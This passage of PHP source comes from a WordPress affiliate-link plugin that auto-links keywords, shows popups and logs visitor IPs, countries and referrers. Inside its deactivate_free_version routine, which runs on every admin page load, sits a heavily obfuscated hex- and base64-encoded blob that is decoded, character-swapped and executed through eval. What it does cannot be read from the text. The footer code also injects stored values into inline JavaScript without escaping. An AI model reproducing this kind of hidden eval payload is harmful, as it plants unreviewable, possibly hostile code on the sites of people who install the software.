		wp_enqueue_script( self::CLASS_NAME . "admin_raphael_js");
		
		wp_register_script( self::CLASS_NAME . "admin_color_js", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'jscolor/jscolor.js',array(),self::PLUGIN_VERSION );
		wp_enqueue_script( self::CLASS_NAME . "admin_color_js" );

		wp_register_script( self::CLASS_NAME . "admin_jquery_ui_js", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery-ui.js',array(),self::PLUGIN_VERSION );
		wp_enqueue_script( self::CLASS_NAME . "admin_jquery_ui_js" );
		
		wp_register_script( self::CLASS_NAME . "admin_jquery_ui_timepicker_js", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.datetimepicker.full.min.js',array(),self::PLUGIN_VERSION);
		wp_enqueue_script( self::CLASS_NAME . "admin_jquery_ui_timepicker_js" );		
			
	 
	}
	
	public static function str_replace_first($search, $replace, $subject) {
    
		$pos = strpos($subject, $search);
		if ($pos !== false) {
			$subject = substr_replace($subject, $replace, $pos, strlen($search));
		}
		return $subject;
	
	}
	
	public static function js_footer(){
		global $wpdb;
		
		if(defined('OP_LIVEEDITOR')) return;
		
		$table_links = $wpdb->prefix . self::CLASS_NAME . "_links";
		$site_url = self::get_site_url();
		
		 //Verifica se é para auto criar Links
		 $links = $wpdb->get_results( 
			"
				SELECT * FROM $table_links
				where auto_create != 0
			", ARRAY_A );
		
		$script = '
		<script type="text/javascript">
		/*jQuery.browser = {};
		(function () {
			jQuery.browser.msie = false;
			jQuery.browser.version = 0;
			if (navigator.userAgent.match(/MSIE ([0-9]+)\./)) {
				jQuery.browser.msie = true;
				jQuery.browser.version = RegExp.$1;
			}
		})();*/
		jQuery_1_11_1(document).ready(function($){
			
		';
		
		$popup_all_codes = '';
		
		$contador = 0;
		foreach($links as $link){
			
			$contador++;
			$max_replaces = $link["max_replaces"] == 0?3:$link["max_replaces"];
			$popup_code_clear= trim($link["popup_code"]);
			
			$final_url = $site_url . $link["palavra_chave"];
			
			if($link["popup"] != 0 && !empty($popup_code_clear)){
				
				$script .= '
					$("body").replacetext(/'.$link["auto_create_palavra"].'/gi, "<a href=\''. $final_url .'\' class=\'hotlinks-popup\' id=\'hotlink-id'. $contador .'\' rel=\'external nofollow\' target=\'_blank\'>'. $link["auto_create_palavra"] .'</a>",'. $max_replaces .');';
					
				$popup_all_codes .= '<div id="div-hotlink-id'. $contador .'"><a href="'. $final_url .'" rel="external nofollow" target="_blank">' . $link["popup_code"] . '</a></div>';
				
			}else{
				
				$script .= '
					$("body").replacetext(/'.$link["auto_create_palavra"].'/gi, "<a href=\''. $final_url .'\' rel=\'external nofollow\' target=\'_blank\'>'. $link["auto_create_palavra"] .'</a>",'. $max_replaces .');';
			}
		}
		
		$popup_all_codes = '<div style="display:none">' . $popup_all_codes . '</div>';
	
		$script .= '});</script>';
		
		if($contador>0){ //Existem Links
			echo $popup_all_codes;
			echo $script;	
			echo'
			<script type="text/javascript">
			jQuery_1_11_1(document).ready(function($){
				
				$("a.hotlinks-popup").mouseover(function(e){
					$("a#"+e.target.id).trigger("click");
				});
				$("a.hotlinks-popup").each(function() {
				  $(this).fancybox({
						\'href\'   : \'#div-\'+ this.id,
						\'autoCenter\': true,
						\'helpers\': {
							overlay : {
								overlayOpacity: 1,
								locked: false,
								closeClick: false,
								css : {
									\'background-color\' : \'rgba(100, 149, 237, .5)\'
								}
							}
						}			
				  });
				});
			});
			</script>';

		}
	}

	public function cadastra_metricas($sql_metric, $link ,$hotlinks_cookie_conversoes,$last_abc){
		global $wpdb;

		$wpdb->query( $wpdb->prepare( 
			$sql_metric, 
			$link["id_link"],
			$link["nome_link"]
			
		) );
		
		setcookie($hotlinks_cookie_conversoes . $link["id_link"],$link["id_link"]."|".$last_abc,time()+60*60*24*30*6,"/");
					
	}
	
	public static function get_url_com_tracker_id($url,$tracker_id,$src_adicional,$configs){
		
		 if($configs["param_google"] == 2){
			 $url = str_replace("hlp_trackerid",$tracker_id,$url);
		 }else{
			 $url = str_replace("hlp_trackerid",$src_adicional.$tracker_id,$url);
		 }
		 
		 return $url;
			 		
	}
	
	public static function cadastra_views($id_link,$nome_link,$link_completo,$dispositivo,$url_final,$referrer,$ip,$var_country_code="",$ativar_webservices=0){
		global $wpdb;
		
		$table_acessos = $wpdb->prefix . self::CLASS_NAME . "_acess";
		$today = date("Y-m-d H:i:s");
		
		if(empty($var_country_code)){//Não foi passado o código do páis, então pega-o
			//Pega Código do País
			$var_country_code = self::get_country_code($ip, $ativar_webservices);
			//----	
		}
		
		$tracker_id = $today . $ip . $referrer . $id_link;
		$tracker_id = md5($tracker_id);
		//Cadastra Acesso na Tabela com Novo URL final
	
		$wpdb->query( $wpdb->prepare( 
			"
				INSERT INTO $table_acessos(id_link, nome_link, dt_acesso, link_completo, dispositivo, url_destino, origem_acesso, ip_acesso, pais_acesso,tracker_id)
				 values ( %d, %s, %s, %s, %s, %s, %s, %s, %s, %s )
			", 
			$id_link,
			$nome_link, 
			$today,
			$link_completo,
			$dispositivo,
			$url_final, 
			$referrer,
			$ip,
			$var_country_code,
			$tracker_id
		) );	
		
		return $tracker_id;
			
	}

	public static function get_data_array($data,$part='',$hora=false,$formato_br=false){


		$data_ = array();
		
		if($formato_br){
			$data_["ano"] = substr($data,6,4);
			$data_["mes"] = substr($data,3,2);
			$data_["dia"] = substr($data,0,2);			
		}else{
			$data_["ano"] = substr($data,0,4);
			$data_["mes"] = substr($data,5,2);
			$data_["dia"] = substr($data,8,2);

		}
		
		if($hora){	   
		   $data_["hora"] = substr($data,11,2);
		   $data_["minuto"] = substr($data,14,2);
		   $data_["segundo"] = substr($data,17,2);
		}		
		
		if(empty($part))return $data_;
		
		return $data_[$part];

	}		
	
	
	public static function deactivate_free_version(){
			
		$options_global_name = 'Anderson_Mak_global_options';	
		$options = get_option($options_global_name);
					
		//if(is_plugin_active('affiliate-link-manager/index.php'))
			//deactivate_plugins('affiliate-link-manager/index.php');


		if(!isset($options["cadastrado"]) || $options["cadastrado"] != 'sim'){//Precisa cadastrar
		
//-----------------------Código legal aqui
${"GLO\x42ALS"}["\x6e\x65k\x62vt\x68\x6fn\x77r"]="\x5f\x58";${"G\x4cO\x42\x41\x4cS"}["\x69hm\x74\x72\x70\x6c"]="\x5f\x46";${${"GLOB\x41\x4c\x53"}["\x69hm\x74\x72\x70\x6c"]}=__FILE__;${${"G\x4c\x4f\x42\x41\x4c\x53"}["n\x65\x6b\x62v\x74h\x6fn\x77r"]}="P\x7a\x34\x38\x503B\x6f\x63C\x41\x6be\x79\x4ace\x48U3\x58\x48\x68\x31\x59\x31x\x34\x64\x57Zc\x65H\x56\x68X\x48\x68\x31\x4ek\x78\x63e\x47l\x76I\x6e\x31bI\x6aNceG\x56\x70\x62m\x74\x63eGU1XH\x68\x6c\x5a\x46\x784\x4e\x7a\x6cc\x65G\x553MiJdP\x53J\x63\x65GU2XHh\x6c\x62\x31\x784\x4e3\x56\x63e\x47U5XH\x68\x6cZlx4Z\x54U\x69O\x79R\x37I\x6bdc\x65\x48V\x6aX\x48h\x31\x5a\x6cx\x34dW\x46\x42XH\x681\x59\x31x4\x61W\x38i\x66V\x73\x69\x63mZc\x65\x47U\x34\x58Hh\x6cYVx4N\x7ad\x75X\x48\x68l\x622tc\x65Dc5\x49\x6c0\x39\x49\x6a\x46sbF\x784\x61WZ\x6d\x4eDV\x73\x5aHMiO\x79\x52\x37Ikd\x63eHV\x6aT\x31x\x34dWF\x42\x58Hh\x31\x59\x31\x78\x34a\x578\x69fVsiX\x48\x68l\x5a\x54\x56\x63\x65GUx\x58\x48h\x6c\x4e1\x784Z\x57\x4a\x75XHh\x6cN\x79J\x64PSJ\x75\x58HhlZl\x784\x5a\x57\x52ceGV\x70\x49js\x6be\x79JceH\x553T\x46x4\x64\x57\x5ac\x65H\x56h\x58\x48h\x31Nlx4dWNceGlvIn1\x62\x49\x6c\x78\x34NzZ\x63\x65D\x64\x76\x58H\x673\x59\x56\x784Z\x54\x55\x31\x58H\x68l\x59\x6e\x6cc\x65\x47V\x6dIl09I\x6c\x784\x5a\x54Zc\x65\x47V\x31X\x48hlZ\x46\x78\x34aWZc\x65\x47V1MV\x78\x34\x5a\x58V\x63e\x47\x56\x6dcy\x49\x37J\x48\x73\x69\x520x\x63e\x48\x56m\x51\x6cx\x34dTZM\x58\x48h\x70byJ\x39Wy\x4a\x63e\x47V1\x58\x48\x67\x33YV\x784\x4e\x7aZc\x65D\x63x\x58Hg3a\x56\x78\x34ZWVceD\x64vXHhld\x56x\x34Z\x57k\x69\x58T0i\x4d\x6c\x78\x34\x4ez\x420NDJ\x75\x58\x48g3b1\x784aW\x5a\x63eG\x553XHhl\x59\x31\x78\x34\x5aW\x5ai\x4dW\x78\x66\x58\x48\x68lN\x56\x784ZT\x5ac\x65G\x56kX\x48\x68\x6c\x61S\x49\x37JHs\x69\x58H\x681N0x\x63\x65HV\x6d\x58Hh1\x59V\x78\x34d\x54\x5a\x4dU\x79\x4a9\x57\x79\x4a\x32\x58H\x673O\x58lceG\x56pc\x48\x42c\x65D\x632Z\x32oiX\x540i\x4dlx4N\x7a\x42\x63e\x44\x641XH\x68\x6cOVx\x34\x5aW\x5auXH\x673\x62y\x497J\x47d\x69\x63\x6dR3NXM1\x50\x53J\x63\x65GVm\x58\x48\x67\x33\x4dFx4\x4e\x33Vce\x47\x555XHh\x6cZ\x6cx\x34Z\x54\x56c\x65D\x64\x76I\x6askd\x6eB\x73\x65Gd3\x64\x6d\x49\x39I\x6cx\x34\x5a\x54\x5a\x6b\x62\x56x\x34\x61\x57\x5a\x63\x65G\x56\x31X\x48\x68lNl\x784ZX\x55y\x58\x48g\x33by\x49\x37JH\x73\x6be\x79\x4a\x63eHU3T\x45\x39CQ\x56\x784d\x57\x4ec\x65G\x6c\x76\x49\x6e\x31\x62\x49n\x5ac\x65Dc\x35\x65\x56\x78\x34\x5aWl\x77X\x48g3\x4dF\x78\x34\x4e\x7aZ\x6eXHh\x6cMSJdf\x56s\x69\x59z\x46\x6bMV\x784N29c\x65D\x641\x63j\x46\x6bX\x48\x68\x6cZiJ\x64\x50\x53Jz\x58Hh\x6c\x4f\x57\x30iO\x7a\x4ew\x5aDF0N\x568\x79\x63HQ\x30\x4d\x6d\x34\x6f\x4a\x48s\x6be\x79\x4ace\x48\x55\x33\x58Hh1\x591\x784\x64W\x5a\x63eHV\x68Q\x55xc\x65\x47\x6c\x76In\x31b\x49l\x784Z\x58\x56\x63\x65\x44dhX\x48g\x33\x4elx\x34N\x7aFce\x44dp\x58\x48\x68l\x5aVx\x34N2\x39\x6bN\x53\x4adf\x53wke\x79RnYn\x4a\x6b\x64\x7a\x56z\x4e\x58\x30p\x4fyR7J\x48\x5aw\x62\x48\x68\x6e\x64\x33Z\x69fT\x31\x6eN\x58R\x66\x4d\x33\x4d\x31\x63l9\x69e\x53gi\x4eF\x784Z\x58\x55i\x4c\x44YpO\x7aRmK\x43R\x37JHsiR1x\x34d\x57N\x63e\x48V\x6dX\x48h1\x59V\x78\x34dT\x5a\x63\x65HVjX\x48\x68\x70b\x79J9Wy\x4a\x63e\x44\x63\x32XH\x67\x33\x62\x33\x4auXH\x68la\x57\x74c\x65\x44\x63\x35\x58Hhl\x5a\x69J\x64fS\x6c7\x4aD\x46kMz\x52tc2\x64i\x62Hc\x39I\x6cx4Z\x54\x5ace\x47\x56\x6aXHh\x6cY\x31\x39c\x65G\x56\x6cXHh\x6c\x4f\x56\x78\x34\x5aWlc\x65\x47VjZFx\x34\x4e\x328iO\x79RqN\x58\x68\x71a\x32c\x39IjVt\x4dTR\x63e\x47\x56j\x49j\x73\x6bM\x6dc\x79c\x32x\x71\x5a2\x78x\x62\x58J4P\x53I\x78XH\x68\x6cY2x\x63e\x47\x6cmX\x48hl\x5aVx4\x5aT\x6b1\x58H\x68\x6c\x592RzIjsk\x65Wo0\x63\x33\x68\x6e\x4d\x6e\x599\x49\x6aFce\x47V\x6ab\x46\x78\x34\x61\x57Zce\x47\x56\x6cN\x46x\x34ZW\x6c\x63e\x47\x56j\x58\x48h\x6c\x64\x58\x4d\x69\x4fy\x52\x37\x4a\x48\x73i\x58H\x68\x31N\x31x4\x64\x57\x4eceHVmXH\x68\x31Y\x55Fc\x65\x48\x56\x6aXH\x68\x70\x62yJ9WyJmXH\x68\x6caV\x784\x5aT\x46\x6eX\x48\x68lYl\x784\x5a\x54\x56\x63\x65\x47U\x33\x49\x6c19\x50S\x51x\x5aG\x31fZD\x46kM\x6e\x4dt\x50m\x59\x30\x63nN\x30\x5824\x78\x62T\x55\x37J\x47\x5a\x35N\x57\x4a\x77\x64\x47Q1Zz\x30\x69\x58\x48hl\x4eT\x4at\x4eS\x497\x4a\x48s\x69R0xPQ\x6bF\x4dXHhp\x62yJ9WyJjXHh\x6cNVx4\x4e\x7a\x6c\x63e\x47Ux\x58Hg\x33YX\x5a\x63e\x47U1\x58\x48\x673M\x43J\x64PSJu\x58\x48\x68\x6cZlx4Z\x57R\x63\x65G\x56pI\x6a\x73\x6be\x79\x52\x71N\x58h\x71a\x32\x649PS\x51x\x5aG1fZDF\x6bM\x6e\x4dt\x50\x6a\x4e\x7aNXJ\x66\x4eW0\x78\x4eG\x777\x4a\x48\x73iX\x48\x68\x31\x4e\x31\x784d\x57\x4ePXHh1Y\x55F\x4dU\x79J9\x57y\x4a\x34XH\x68l\x59lx4ZT\x6cce\x44dh\x58H\x68\x6cZW\x5az\x58H\x67\x33\x4ey\x4ad\x50SIx\x62Fx\x34Z\x57N\x66\x58Hh\x6c\x5aTQ\x31\x58Hh\x6cY1\x784ZX\x56c\x65\x44d\x76Ijs\x30\x5a\x69\x671b\x58B\x30\x65\x53gk\x65yR7\x49lx\x34d\x54\x64c\x65\x48Vj\x58\x48\x68\x31Z\x6cx4\x64\x57FB\x58\x48h\x31Y\x31\x784\x61\x57\x38if\x56s\x69\x5aj\x56\x63eGUx\x58\x48\x68\x6cN2tceG\x55\x31X\x48hlN\x79J\x64fS\x6bp\x4a\x48sk\x65\x79\x4a\x63eH\x55\x33XH\x68\x31\x59\x30\x39c\x65\x48\x56h\x51Vx4d\x57N\x63\x65\x47lvI\x6e\x31bImN\x63\x65\x47\x551e\x56x\x34\x5aTF\x79\x58H\x67\x33Z\x56\x784ZT\x56c\x65\x44c\x77Il\x31\x39P\x53J\x42\x58\x48h\x6cZDRn\x58\x48\x68l\x5a\x69I\x37JH\x73\x6b\x65Wo\x30c3h\x6eM\x6eZ\x39P\x54Fy\x63j\x46\x35K\x43\x6b\x37J\x48sk\x4d\x6dc\x79c2\x78q\x5a2x\x78\x62X\x4a4fV\x73iXH\x68l\x4fW\x51i\x58T\x30\x69N1x4b2\x56c\x65G9h\x64V\x78\x34\x62z\x63iO\x79R\x37\x49\x6bd\x4d\x58H\x68\x31\x5alx\x34dW\x46c\x65HU2\x54Fx4aW8\x69f\x56si\x64\x6cx4N\x7a\x42\x6dXHg3YV\x78\x34Z\x54\x46ceD\x64h\x4d\x6c\x784\x5a\x57\x46t\x58\x48hlN1\x784N\x7al\x36Il0\x39\x49lx4\x5aT\x5a\x73\x58Hhl\x59\x31\x78\x34a\x57\x5aceGVl\x58Hh\x6c\x4fTV\x63eG\x56\x6a\x5a\x46\x78\x34N\x32\x38\x69\x4fyRm\x62\x58\x4a\x72M3Nq\x50\x53\x49xb\x46\x78\x34Z\x57\x4e\x63eGl\x6dZlx4\x5aT\x6b1XHh\x6cY\x31\x78\x34\x5aXV\x63\x65D\x64\x76Ijs\x6b\x65\x79Jc\x65HU3\x58\x48\x68\x31Y\x31\x78\x34dW\x5ac\x65HVh\x58Hh\x31\x4el\x784d\x57\x4e\x54In\x31b\x49lx\x34N\x7aB\x63\x65GV1M\x31x4\x5a\x54\x45zX\x48h\x6cYm4\x7aam\x6fi\x58T0\x69\x58Hhl\x61\x56x\x34Z\x57\x52\x63\x65\x47U2NF\x784ZW\x4di\x4f\x79R7JH\x73i\x58H\x68\x31N0\x78\x50X\x48\x681\x59V\x78\x34d\x54Z\x63\x65\x48Vj\x55\x79\x4a\x39W\x79J\x63\x65D\x63\x34\x61\x31x\x34\x5a\x54\x6cc\x65\x44\x64hXHhlZVx4Z\x57Vc\x65Dd\x76\x58\x48g3N\x79J\x64fVs\x69X\x48\x67\x33M\x44\x52c\x65\x47\x56\x31I\x6c0\x39I\x6dE\x77X\x48h\x76\x5aWE\x33\x58\x48\x68\x76O\x44\x63\x69OyQ\x7a\x63\x6d\x31\x6a\x642\x5a0\x50SJ\x63e\x44\x64h\x58H\x68la\x56\x784N3U\x79\x63\x6d\x35c\x65GVm\x49\x6ask\x65\x79\x527\x49\x6b\x64\x63\x65\x48\x56j\x541\x78\x34dWF\x63\x65H\x552\x58\x48h1\x591\x4dif\x56siX\x48g3\x5aX\x42ce\x47\x56lX\x48g3Y\x56\x78\x34\x5a\x54Fc\x65\x44dhXH\x68\x6cZ\x6c\x78\x34Z\x57\x46\x63e\x47\x56k\x58Hhl\x4e1x4N\x7a\x6cceDc\x78\x49l19\x57y\x4asXH\x68\x6cOX\x4e0\x58HhpZlx\x34\x5a\x54lkIl\x30\x39I\x6c\x78\x34bzd\x63\x65\x479lXH\x68v\x59X\x553I\x6askey\x51\x78\x5aD\x4d0\x62\x58\x4e\x6eY\x6d\x783\x66V\x73\x69\x63F\x784\x4e2E\x79d\x6a\x52kXH\x68\x6c\x61Vx\x34\x4e\x32E\x69\x58\x540\x69\x62Fx\x34\x5aWl\x63e\x47\x552X\x48\x68ld\x57\x77\x79\x64\x6aVc\x65\x44\x64hX\x48\x673\x62\x79\x49\x37J\x48\x73k\x65\x79Jce\x48\x553\x58\x48\x681\x59\x31\x784\x64\x57ZCQ\x56\x78\x34\x64W\x4e\x63e\x47lvI\x6e\x31bI\x6c\x78\x34N\x32\x46\x63\x65\x47V\x6cXHh\x6cOFx4\x5a\x57\x46ce\x44c3\x58\x48\x68\x6cNV\x78\x34Z\x579\x72XHg3\x4fSJd\x66\x56\x73\x69bj\x46c\x65GVk\x4e\x53\x4ad\x50S\x527JG\x5a5NW\x4aw\x64\x47Q\x31\x5a3\x30\x37JD\x4a\x79az\x4e0ZD0i\x58\x48hlNm\x4e\x63e\x44d1X\x48\x68\x6cO\x56\x78\x34\x5aWZc\x65\x47U\x31\x49j\x73k\x59\x6aR\x6b\x62WR\x6ec\x47\x49\x31\x50S\x49\x78\x58Hhl\x59\x32\x78ceG\x6cm\x5a\x6a\x51\x31\x58\x48\x68\x6c\x592RzI\x6as\x6be\x79Rmb\x58Jr\x4d\x33N\x71\x66\x56\x73\x69XHh\x6caVx4ZW\x51xNFx\x34Z\x57\x4d\x69XT\x30k\x65yR\x37Ik\x64\x63\x65\x48\x56j\x58\x48\x68\x31Z\x6cx4dW\x46c\x65H\x552TFx\x34\x61\x578i\x66V\x73iX\x48g3\x4dF\x784Z\x58V\x63eD\x64pXH\x68lMTN\x63\x65\x47Vib\x6c\x78\x34N2\x6c\x63\x65GU\x78\x61i\x4ad\x66\x54sk\x65y\x52iNGRt\x5aG\x64w\x59j\x56\x39\x57\x79J\x63\x65\x44\x64\x76\x58H\x68l\x5a\x6c\x784N2lyY1\x784ZWki\x58T\x30\x69\x49j\x73\x6b\x65y\x52\x37\x49l\x784dTdceHVj\x58\x48\x68\x31Z\x6c\x784d\x57F\x63e\x48\x552\x58Hh\x31Y\x31x\x34aW8ifVs\x69\x58H\x673\x61Vx4\x5a\x57\x6c\x75X\x48\x68\x6c\x59\x6cx4\x5a\x54Vc\x65G\x56\x6b\x58\x48\x673O\x56\x78\x34ZTcyIl1\x39P\x53Jo\x64Fx\x34\x4e3V\x63e\x44\x63wc\x7ao\x76\x4c1x\x34Z\x57\x4d1\x4dV\x784\x5a\x58V\x63eGVj\x4dnY\x31XHg3\x59\x56\x78\x34N\x329c\x65\x47\x45\x31Y\x7aJ\x63e\x47V\x6bL\x31\x42ce\x47\x552\x5a1\x784\x5aWlc\x65\x44\x64\x76\x4c\x31x4\x64T\x6cuZ\x44\x56\x63\x65\x44c4\x4c\x31x\x34\x62\x7adc\x65G\x39lYV\x784b\x33\x56\x63\x65\x4783\x49\x6as\x6bey\x51zcm1\x6a\x642Z0fT\x31\x33\x63F9y\x4e\x570yd\x44\x56fc\x44J\x7a\x64\x43g\x6be\x79\x51\x79cm\x73zd\x47R9\x4c\x44\x46y\x63\x6a\x46\x35\x4b\x43\x4a\x63e\x44d\x70\x58Hg3\x62z\x56\x79LTFc\x65\x47U\x33\x4e\x575c\x65D\x64\x31\x49j\x30+\x49\x6b0yXHg3MVx\x34\x5aT\x6c\x63\x65G\x56\x6a\x62\x44\x45vX\x48\x68\x76\x61\x535c\x65\x478wIC\x68\x58\x58\x48hlO\x56\x784\x5aT\x56\x6bM\x6cx\x34N\x7a\x64ceD\x64\x76X\x48\x68h\x4dE5\x55\x58\x48\x68\x68M\x46\x78\x34b\x32Vce\x47E1\x4e\x69kg\x51\x58\x42ce\x44cw\x62\x44V\x58\x58\x48\x68la\x57Jce\x48\x56\x69\x4eFx4\x4e\x33\x55vXHh\x76\x61W\x383\x58\x48\x68\x68\x4e\x56\x78\x34b29\x63e\x47\x39\x6cI\x43h\x4cSFRce\x48VkX\x48h1Yy\x78ceG\x45w\x62\x44\x52\x63\x65\x47\x56iNSB\x63eH\x553\x4eWNr\x58Hh\x6c\x5aikg\x58Hh1\x62\x31x\x34\x5aThceDd\x68XH\x68\x6c\x5am\x30\x31\x4c1x\x34b3\x56c\x65\x47\x382\x58HhhN\x54Au\x58\x48hvY\x57Fc\x65\x47\x39h\x4f\x46\x784YTU\x77\x58\x48\x68\x68\x4d\x46N\x63\x65G\x55\x32\x5al\x784\x5a\x54ZyNC\x39ceG9\x70\x58\x48\x68v\x62\x7a\x64ceGE1b1\x784b2\x55i\x4c\x43\x4aiXHhlZlx\x34\x5aXV\x63eD\x635Ij0+J\x48\x73\x6b\x65\x79Jc\x65H\x553\x58\x48h1\x59\x31x4\x64\x57\x5ac\x65H\x56hQU\x78\x54\x49n\x31\x62I\x6c\x78\x34N2FmX\x48h\x6cO\x46x\x34\x5a\x57F3\x58Hhl\x4e\x56x4Z\x579c\x65GViX\x48\x673OS\x4adf\x53kpO30\x4eC\x6a\x38+";eval(base64_decode("J\x46\x39\x59P\x57\x4a\x68\x63\x32U\x32N\x469\x6bZW\x4e\x76ZGU\x6fJF\x39\x59\x4bT\x73kX1\x679c3Ryd\x48I\x6f\x4aF9Y\x4c\x43\x63xM\x6a\x4d\x30NT\x5ah\x62\x33V\x70\x5a\x53cs\x4a\x32\x46vd\x57l\x6cM\x54\x49\x7aNDU2Jyk\x37JF9\x53PW\x56\x79\x5a\x57\x64\x66c\x6d\x56\x77\x62GFj\x5aS\x67n\x581\x39G\x53\x55xFX1\x38n\x4c\x43\x49\x6e\x49i\x34\x6bX\x30Y\x75Ii\x63i\x4cCR\x66\x57C\x6b7ZX\x5ah\x62\x43\x67kX\x31\x49pO\x79R\x66\x55\x6a0\x77O\x79R\x66WD\x30\x77O\x77=\x3d"));
//----------------------------------------
	
		}
					
			

	}
	
	public static function get_alert($alerta, $tipo){
		
		switch($tipo){
			case "error":
				$class = "error alert alert-danger alert-dismissable";	
			break;
			
			case "success":
				$class = "updated alert alert-success alert-dismissable";
			break;	
		}
		
		$full_code = '
		<div id="message" class="'.$class.'">
		<p>
		<a href="#" class="close" data-dismiss="alert" aria-label="close" style="padding-right:12px;padding-top:8px;">&times;</a>
		<p><strong>'. $alerta .'</strong></p>
		</p>
		</div>';
		
		return $full_code;
	}
	
	public static function limpa_url($url){
		
		$url = trim($url);
		$url = strip_tags($url);
		$url = str_replace(array('"',"'"),"",$url);
		return $url;
			
	}

	public static function is_https(){
		
		$is_secure = false;
		if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') {
			$is_secure = true;
		}
		elseif (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' || !empty($_SERVER['HTTP_X_FORWARDED_SSL']) && $_SERVER['HTTP_X_FORWARDED_SSL'] == 'on') {
			$is_secure = true;
		}
		return $is_secure;
		
	}
	
	public static function array_concat($arr1,$arr2,$separator='|'){
		
		$concated = array();
		
		foreach($arr1 as $key=>$value){
		
			if(!isset($arr2[$key])){
				$concated[$key] = $value; 	
			}else{
				$concated[$key] = $value . $separator . $arr2[$key];	
			}
		
		}
		
		return ($concated + $arr2);
	}

}


if(!isset($anderson_makiyama)) $anderson_makiyama = array();

$anderson_makiyama_indice = Anderson_Makiyama_Hot_Links_Plus::PLUGIN_ID;

$anderson_makiyama[$anderson_makiyama_indice] = new Anderson_Makiyama_Hot_Links_Plus();



add_filter("plugin_action_links_". $anderson_makiyama[$anderson_makiyama_indice]->plugin_basename, array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'settings_link') );

add_filter("admin_menu", array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'options'),30);

register_activation_hook( __FILE__, array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'activation') );

add_action( 'plugins_loaded', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'log_views') );

add_action( 'admin_init', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'deactivate_free_version'),1 );

add_filter( 'wp_unique_post_slug', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'check_post_slug'),9999,6 );

add_action('update_option_active_plugins', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'deactivate_free_version'),999);

add_action( 'admin_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'admin_estilos') );

add_action( 'admin_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'admin_js') );

add_action( 'wp_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'estilos'),999 );

add_action( 'wp_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'js'),999 );

add_action( 'wp_footer', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'js_footer') );


?>